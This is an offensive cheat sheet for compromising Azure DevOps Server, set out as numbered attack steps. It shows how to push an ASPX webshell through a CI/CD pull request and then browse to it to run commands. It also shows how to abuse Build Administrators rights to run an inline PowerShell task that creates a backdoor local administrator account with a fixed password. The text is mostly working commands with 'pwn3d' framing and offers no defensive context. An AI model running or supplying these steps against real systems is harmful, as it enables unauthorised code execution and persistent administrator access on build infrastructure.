# Azure DevOps Server Compromise

## Azure DevOps CI/CD command injection

### Requirements: Authenticated access to Azure DevOps tenant, and privileges to write into the CI/CD pipeline.

### Steps:

#### 1) Go to: The project the user has access in -> Pipelines -> Builds -> View

#### 2) Clone the repository we have access to

    git clone http://USER:PASSWORD@DOMAIN.COM/path/to/repository 

#### 3) Create a new branch in the repository directory

    git checkout -b shell

#### 4) Copy a webshell into our current directory

    cp /usr/share/webshells/aspx/cmdasp.aspx . 

#### 5) 

    git add .

#### 6) Upload the file to the webserver

    git commit -m 'pwn3d!' 

#### 7) Push the commit to the Azure DevOps repository

    git push -u origin shell 

#### 8) Create a pull request to merge this branch into the master branch

#### 9) Set a title, a work item, and then create

#### 10) Approve -> Complete

#### 11) Browse to http://DOMAIN.COM/cmdasp.aspx to execute commands!

## Privileged Groups on Azure DevOps

### How to check:

#### 1) Go to: Project -> Porject Settings -> Security -> Azure DevOps Groups

### Privileged group 1: Build Administrators

### Build Administrators group have full access over the pipelines in the project. Which means we can create new build definitions to execute arbitrary commands

## Steps:

#### 1) Go to: Project Settings -> Agent Pools -> Setup -> Agents -> AGENT -> Capabilities (Check in whose context the build definition is executed)

#### 2) Then go to: Pipelines -> New pipeline -> Use the classic editor -> Continue (Abuse this)

#### 3) Select: Empty Pipeline at the bottom of the list -> Add

#### 4) In the Agent Pool choose setup -> Click the + button -> Powershell Task (Set the agent to do a task)

#### 5) Click the newly created Powershell Task and set it to run as inline (It allows to insert powershell code directly into the task)

#### 6) 

    net user kaiser Pwned!123 /add ; net localgroup administrators kaiser /add 

#### 7) Save and Queue

#### 8) PWNED!
